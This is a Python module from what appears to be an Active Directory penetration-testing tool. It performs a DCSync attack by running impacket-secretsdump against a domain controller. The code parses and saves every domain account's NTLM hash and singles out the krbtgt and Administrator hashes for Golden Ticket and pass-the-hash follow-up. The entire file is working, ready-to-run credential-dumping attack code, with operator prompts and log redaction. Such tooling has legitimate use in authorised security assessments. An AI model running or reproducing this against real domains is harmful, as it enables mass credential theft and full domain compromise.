"""
dcsync_module.py - DCSync Attack module for AD-Pathfinder.

Dumps all domain account hashes via impacket-secretsdump, simulating
the DCSync replication attack. Requires domain admin or equivalent rights.

Tools used:
    - impacket-secretsdump  (pip install impacket)

Command (from playbook):
    impacket-secretsdump <domain>/<user>:<pass>@<target_ip>

Output format:
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::
"""

from __future__ import annotations

import os
import re
import sys
from typing import Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from executor import CommandExecutor
from session import AssessmentState

try:
    from rich.console import Console
    from rich.prompt import Prompt
    from rich.table import Table
    from rich import box
    _RICH = True
    console = Console()
except ImportError:
    _RICH = False
    console = None  # type: ignore


# ─────────────────────────────────────────────────────────────────────────────
# Regex patterns
# ─────────────────────────────────────────────────────────────────────────────

# Matches: username:RID:LMhash:NThash:::
HASH_LINE_RE = re.compile(
    r"^([^:]+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::",
    re.IGNORECASE | re.MULTILINE,
)

# Impacket tool names to try in order
IMPACKET_BINS = [
    "impacket-secretsdump",
    "secretsdump.py",
    "secretsdump",
]


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _detect_secretsdump(executor: CommandExecutor) -> Optional[str]:
    for binary in IMPACKET_BINS:
        if executor.check_tool(binary):
            return binary
    return None


def _parse_hashes(output: str) -> list[dict]:
    """
    Parse secretsdump output into structured list.

    Returns
    -------
    list[dict]
        [{username, rid, lm, nt}]
    """
    results = []
    for m in HASH_LINE_RE.finditer(output):
        username = m.group(1).strip()
        # Skip machine accounts and empty hashes
        if username.endswith("$"):
            continue
        results.append({
            "username": username,
            "rid":      m.group(2),
            "lm":       m.group(3),
            "nt":       m.group(4),
        })
    return results


def _save_dump_file(raw_output: str, assessment_id: str) -> str:
    os.makedirs("reports", exist_ok=True)
    path = os.path.join("reports", f"{assessment_id}-dcsync.txt")
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(raw_output)
    return os.path.abspath(path)


def _pick_credentials(state: AssessmentState) -> dict:
    if state.valid_credentials:
        return state.valid_credentials[0]
    if state.initial_credentials.username:
        return {
            "username":  state.initial_credentials.username,
            "password":  state.initial_credentials.password,
            "ntlm_hash": state.initial_credentials.ntlm_hash,
        }
    return {"username": "", "password": "", "ntlm_hash": ""}


# ─────────────────────────────────────────────────────────────────────────────
# DCSyncModule
# ─────────────────────────────────────────────────────────────────────────────

class DCSyncModule:
    """
    DCSync Attack — dump all domain hashes via impacket-secretsdump.

    Requires domain admin or equivalent (Replicating Directory Changes All).

    Command:
        impacket-secretsdump <domain>/<user>:<pass>@<target_ip>
    """

    def __init__(self, executor: Optional[CommandExecutor] = None) -> None:
        self.executor = executor or CommandExecutor(verbose=False)

    def run(self, state: AssessmentState) -> dict:
        """
        Execute DCSync and parse all domain hashes.

        Returns
        -------
        dict
            {
                "status":    "success" | "error",
                "hashes":    list[dict],   # {username, rid, lm, nt}
                "hash_file": str | None,
                "krbtgt_nt": str | None,   # kribtgt NT hash for Golden Ticket
                "admin_nt":  str | None,   # Administrator NT hash for PTH
                "error":     str | None,
                "warnings":  list[str],
            }
        """
        warnings: list[str] = []

        # ── Tool check ────────────────────────────────────────────────────
        binary = _detect_secretsdump(self.executor)
        if not binary:
            return self._error(
                "impacket-secretsdump not found. Install: pip install impacket"
            )

        # ── Credential selection ──────────────────────────────────────────
        creds = _pick_credentials(state)
        username = creds.get("username", "")
        password = creds.get("password", "")
        ntlm_hash = creds.get("ntlm_hash", "")

        console.print()
        console.print("  [bold bright_cyan]DCSync — Dump All Domain Hashes[/bold bright_cyan]\n")

        if username:
            console.print(f"  [dim]Using stored credentials: {username}[/dim]")
            override = Prompt.ask(
                "  [bold yellow]Use different credentials?[/bold yellow]",
                choices=["yes", "no"], default="no",
            )
            if override == "yes":
                username  = Prompt.ask("  [bold yellow]Username[/bold yellow]").strip()
                password  = Prompt.ask("  [bold yellow]Password[/bold yellow]").strip()
                ntlm_hash = ""
        else:
            username  = Prompt.ask("  [bold yellow]Username[/bold yellow]").strip()
            password  = Prompt.ask("  [bold yellow]Password[/bold yellow]").strip()

        # ── Build command ─────────────────────────────────────────────────
        # Exact playbook: impacket-secretsdump <domain>/<user>:<pass>@<target_ip>
        if ntlm_hash:
            # PTH mode: impacket-secretsdump accepts -hashes LM:NT
            cmd = [
                binary,
                f"{state.domain}/{username}@{state.target_ip}",
                "-hashes", f":{ntlm_hash}",
            ]
            redacted = (
                f"{binary} {state.domain}/{username}@{state.target_ip} "
                f"-hashes :****"
            )
        else:
            cmd = [binary, f"{state.domain}/{username}:{password}@{state.target_ip}"]
            redacted = f"{binary} {state.domain}/{username}:****@{state.target_ip}"

        console.print(f"\n  [bold bright_cyan]Running:[/bold bright_cyan] [dim]{redacted}[/dim]")
        console.print("  [dim]This may take 30-60 seconds...[/dim]\n")

        # ── Confirm ───────────────────────────────────────────────────────
        confirm = Prompt.ask(
            "  [bold red]⚠  DCSync will replicate all domain secrets. Proceed?[/bold red]",
            choices=["yes", "no"], default="no",
        )
        if confirm != "yes":
            return self._error("Aborted by operator.")

        # ── Execute ───────────────────────────────────────────────────────
        result = self.executor.run(cmd, timeout=120)
        output = result["output"]

        if not output and result["status"] == "error":
            return self._error(result["error"] or "secretsdump failed with no output.")

        # ── Parse hashes ──────────────────────────────────────────────────
        hashes = _parse_hashes(output)

        if not hashes:
            warnings.append("No hashes parsed from output — check credentials/permissions.")
            return {
                "status":    "error",
                "hashes":    [],
                "hash_file": None,
                "krbtgt_nt": None,
                "admin_nt":  None,
                "error":     "No hashes found in secretsdump output.",
                "warnings":  warnings,
            }

        # ── Save raw dump ─────────────────────────────────────────────────
        hash_file = _save_dump_file(output, state.assessment_id)

        # ── Extract key accounts ──────────────────────────────────────────
        krbtgt_nt: Optional[str] = None
        admin_nt:  Optional[str] = None

        for h in hashes:
            if h["username"].lower() == "krbtgt":
                krbtgt_nt = h["nt"]
            if h["username"].lower() == "administrator":
                admin_nt = h["nt"]

        # ── Update state ──────────────────────────────────────────────────
        if not hasattr(state, "ntlm_hashes"):
            state.ntlm_hashes = []  # type: ignore[attr-defined]

        for h in hashes:
            entry = {
                "username": h["username"],
                "rid":      h["rid"],
                "lm":       h["lm"],
                "nt":       h["nt"],
            }
            if not any(e.get("username") == h["username"] for e in state.ntlm_hashes):  # type: ignore[attr-defined]
                state.ntlm_hashes.append(entry)  # type: ignore[attr-defined]

        state.log_finding(
            "DCSync",
            f"Dumped {len(hashes)} account hashes from {state.domain}. "
            + (f"krbtgt NT: {krbtgt_nt[:8]}…" if krbtgt_nt else ""),
            severity="CRITICAL",
        )
        state.log_action(f"DCSync ({state.domain}) → {hash_file}")

        return {
            "status":    "success",
            "hashes":    hashes,
            "hash_file": hash_file,
            "krbtgt_nt": krbtgt_nt,
            "admin_nt":  admin_nt,
            "error":     None,
            "warnings":  warnings,
        }

    @staticmethod
    def _error(message: str) -> dict:
        return {
            "status":    "error",
            "hashes":    [],
            "hash_file": None,
            "krbtgt_nt": None,
            "admin_nt":  None,
            "error":     message,
            "warnings":  [],
        }


# ─────────────────────────────────────────────────────────────────────────────
# Convenience wrapper
# ─────────────────────────────────────────────────────────────────────────────

def run(state: AssessmentState, executor: Optional[CommandExecutor] = None) -> dict:
    """
    from modules.dcsync_module import run as dcsync_run
    result = dcsync_run(state)
    """
    return DCSyncModule(executor).run(state)
